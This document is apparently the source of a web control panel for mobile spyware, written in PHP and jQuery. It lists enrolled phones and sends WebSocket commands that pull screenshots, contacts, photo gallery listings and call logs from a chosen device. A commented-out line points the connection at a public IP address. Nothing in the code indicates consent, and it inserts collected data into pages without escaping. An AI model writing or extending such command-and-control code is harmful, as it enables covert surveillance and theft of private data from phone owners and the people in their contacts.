<?php
  session_start();

  if(!isset($_SESSION['user_name'])){
      header('Location: /index.php');
      exit();
  }
?>

<!DOCTYPE html>
<html>
 <head>
   <meta charset="UTF-8">
   <title><?php echo $_SESSION["user_name"]; ?>'s Home</title>
   <link rel="stylesheet" href="./bootstrap/css/bootstrap.css" >
   <link rel="stylesheet" type="text/css" href="./css/theme.css" >
   <script type="text/javascript" src="js/jquery.js"></script>
   <script type="text/javascript" src="bootstrap/js/bootstrap.js"></script>
   <script type="text/javascript" src="js/websocket.js"></script>
   <script type="text/javascript" src="js/jquery.cookie.js"></script>
   <script type="text/javascript" src="js/main.js"></script>
   <script type="text/javascript" src="js/md5.js"></script>
 </head>
 <body class="main-bg">
   <div class="container">
     <div class="jumbotron" style="margin-top:40px">
       <h1>Welcome <?php echo  $_SESSION["user_name"]; ?>!</h1>
       <p>You will see the actual page when it is developed</p>
       <?php if($_SESSION["user_name"]=="super_admin"){
          echo "<a class=\"btn btn-warning\" href=\"./register.php\" >Add New User</a>";
       } ?>
       <button class="btn btn-success" onclick="logout()">Logout</button>
       <br>
       <div id="device_table"></div>
       <div id="image_display"></div>
       <div class="progress">
          <div class="progress-bar" role="progressbar" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100" style="width:70%">
          </div>
      </div>
     </div>
   </div>
   <script>
  // var conn = new WebSocket('ws://43.228.237.131:8080');
    var conn = new WebSocket('ws://localhost:8080');
   	conn.onopen = function(e) {
   	    console.log("Connection established!");
   	};

    conn.onmessage = function(e) {
      console.log(e.data);
  		var msg = JSON.parse(e.data);
      if(msg.type=="gallery_progress"){

        var perc=Math.ceil(100.*(msg.done)/msg.total);
        console.log(perc);
        $('.progress-bar').css('width', perc+'%');
      }
      else if(msg.type=="screenshot"){
        $("#image_display").html("<img src=\"data:image/png;base64,"+msg.image+"\">");
      }else if(msg.type=="contact"){
        alert("contacts are here");
        var htmlString="<table class=\"table\"><thead><tr><th>ID</th><th>Name</th><th>Phones</th></tr></thead>";
        var conts=JSON.parse(msg.list);
        $.each(conts, function(index,value) {
          htmlString+="<tr>";
          htmlString+="<td>"+value.id+"</td>";
          htmlString+="<td>"+value.name+"</td>";
          htmlString+="<td>"+value.phones+"</td>";
          htmlString+="</tr>";
         });
        htmlString+="</table>";
        $("#image_display").html(htmlString);
      }else if(msg.type=="gallery"){
        var img = JSON.parse(msg.list);
          console.log(img);
          var htmlString="";
        for(var i = 0 ;i<img.length;i++){
            htmlString+="<p>"+img[i].folder+"->" + img[i].path+" | "+img[i].page +"</p>";
        }
        $("#image_display").html("<pre>"+htmlString+"</pre>");
      }else if(msg.type=="calllog"){
        $("#image_display").html("<pre>"+msg.list+"</pre>");
      }
  	};

    //conn.send(JSON.stringify(msg));
    function screenshot(id){
      var msg={};
      msg.device=id;
      msg.cmd="screenshot";
      msg=JSON.stringify(msg);
      console.log("sending : "+msg);
        $("#image_display").html("<h1>Getting new Image</h1>");
      conn.send(msg);
    }

    function contacts(id){
      var msg={};
      msg.device=id;
      msg.cmd="contacts";
      msg=JSON.stringify(msg);
      console.log("sending : "+msg);
        $("#image_display").html("<h1>Getting Contacts</h1>");
      conn.send(msg);
    }

    function gallery(id){
      var msg={};
      msg.device=id;
      msg.cmd="gallery";
      msg=JSON.stringify(msg);
      console.log("sending : "+msg);
        $("#image_display").html("<h1>Getting Gallery</h1>");
      conn.send(msg);
    }
    function callLog(id){
      var msg={};
      msg.device=id;
      msg.cmd="calllog";
      msg=JSON.stringify(msg);
      console.log("sending : "+msg);
        $("#image_display").html("<h1>Getting Call Log</h1>");
      conn.send(msg);
    }

   $(document).ready(function(){
     $.getJSON("./db/get_devices.php",function(data){
       var htmlString="<table class=\"table\"><thead><tr><th>Device ID</th><th>Model</th><th>Account</th><th>Activity</th><th>Action(s)</th></tr></thead>";
       $.each(data, function(index, value) {
         htmlString+="<tr>";
         htmlString+="<td>"+value.id+"</td>";
         htmlString+="<td>"+value.name+"</td>";
         htmlString+="<td>"+value.account+"</td>";
         htmlString+="<td>";
         if(value.active==0){
           var time=parseInt(value.last_seen);
           var sec=time%60;
           htmlString+=""+Math.floor(time/60)+" m "+sec+" s ago";
         }else{
           htmlString+="active";
         }
          htmlString+="</td><td>";
          if(value.active==0){
            htmlString+="Wait till active";
          }else{
            htmlString+="<button class=\"btn btn-primary\" onclick=\"screenshot("+value.id+")\" >Screenshot</button><br>";
            htmlString+="<button class=\"btn btn-primary\" onclick=\"contacts("+value.id+")\" >Request Contacts</button><br>";
            htmlString+="<button class=\"btn btn-primary\" onclick=\"gallery("+value.id+")\" >Request Gallery</button><br>";
            htmlString+="<button class=\"btn btn-primary\" onclick=\"callLog("+value.id+")\" >Request Call Log</button><br>";
          }
          htmlString+="</td>";
         htmlString+="</tr>";
        });
       htmlString+="</table>";
       $("#device_table").html(htmlString);

     });

   });
   </script>
 </body>
</html>


//-------------------------------------------------

// var conn = new WebSocket('ws://43.228.237.131:8080');
  var conn = new WebSocket('ws://localhost:8080');
  conn.onopen = function(e) {
      console.log("Connection established!");
  };

  function screenshot(id){
    var msg={};
    msg.device=id;
    msg.cmd="screenshot";
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
      $("#image_display").html("<h1>Getting new Image</h1>");
    conn.send(msg);
  }

  function contacts(){
    var msg={};
    msg.device=active_device.device_id;
    msg.cmd="contacts";
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
      $("*").css("cursor", "wait");
    conn.send(msg);
  }

  function gallery(){
    var msg={};
    msg.device=active_device.device_id;
    msg.cmd="gallery";
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
      var progbar=' <div class="progress"> <div class="progress-bar" id="gallery_proggress_bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width:0%"></div></div>';
      $("#gallery_fetch").html(progbar);
      $("*").css("cursor", "wait");
    conn.send(msg);
  }
  function callLog(){
    var msg={};
    msg.device=active_device.device_id;
    msg.cmd="calllog";
    msg=JSON.stringify(msg);
    console.log("sending : "+msg);
    $("*").css("cursor", "wait");
    conn.send(msg);
  }

  function build_contacts_table(name){
    $.getJSON("../data/"+name,function(data){
      var htmlString='<thead><tr><th>ID</th><th>Name</th><th>Number(s)</tr></thead><tbody>';

      for(var i=0;i<data.length;i++){
        var row="<tr>";
        var numbs=data[i].phones;
        numbs = numbs.substr(1,numbs.length-2);
        row+="<td>"+data[i].id+"</td><td>"+data[i].name+"</td><td>"+numbs+"</td>";
        row+="</tr>";
        htmlString+=row;
      }
      htmlString+="</tbody>";
      $("#contacts_fetch").html(htmlString);
      $("#contacts_fetch").DataTable();
      $("#contacts_loader").html('');
      $("*").css("cursor", "default");
    });
  }

  function build_call_log_table(name){
    $.getJSON("../db/"+name,function(data){
      var htmlString='<thead><tr><th>ID</th><th>Name</th><th>Number(s)</tr></thead><tbody>';

      for(var i=0;i<data.length;i++){
        var row="<tr>";
        var numbs=data[i].phones;
        numbs = numbs.substr(1,numbs.length-2);
        row+="<td>"+data[i].id+"</td><td>"+data[i].name+"</td><td>"+numbs+"</td>";
        row+="</tr>";
        htmlString+=row;
      }
      htmlString+="</tbody>";
      $("#contacts_fetch").html(htmlString);
      $("#contacts_fetch").DataTable();
      $("#contacts_loader").html('');
      $("*").css("cursor", "default");
    });
  }

  function build_gallery_fectcher(){
    $.getJSON("../db/get_gallery.php?device_id="+active_device.device_id,function(data){
      var htmlString='<thead><tr><th>Folder</th><th>Path</th><th>Cache</th></thead><tbody>';
      for(var i=0;i<data.length;i++){
        var row="<tr>";
        var ct="";
        if(data[i].cached=="0"){
          ct='<button type="button" class="btn btn-warning btn-sm" data-id="'+data[i].id+'">Fetch</button>';
        }else{
          ct='<button type="button" onclick="gallery_preview(this)" class="btn btn-primary btn-sm" data-image="'+data[i].cached+'">Preview</button>'
        }
        row+="<td>"+data[i].name+"</td><td>"+data[i].number+"</td><td>"+ct+"</td>";
        row+="</tr>";
        htmlString+=row;
      }
      htmlString+="</tbody>";
      $("#gallery_fetch").html(htmlString);
      $("#gallery_fetch").DataTable();
      $("*").css("cursor", "default");
    });
  }

  conn.onmessage = function(e) {
    var msg=JSON.parse(e.data);
    console.log(msg);
    switch(msg.type){
      case "calllog":
      build_call_log_table(msg.list);
      break;
      case "contacts":
      build_contacts_table(msg.list);
      break;
      case "gallery_progress":
      $("#gallery_proggress_bar").css("width",Math.ceil((msg.done*100)/msg.total)+"%");
      if(msg.done == msg.total){
        $("#gallery_proggress_bar").parent().slideUp();
      }
      break;
    }
  }
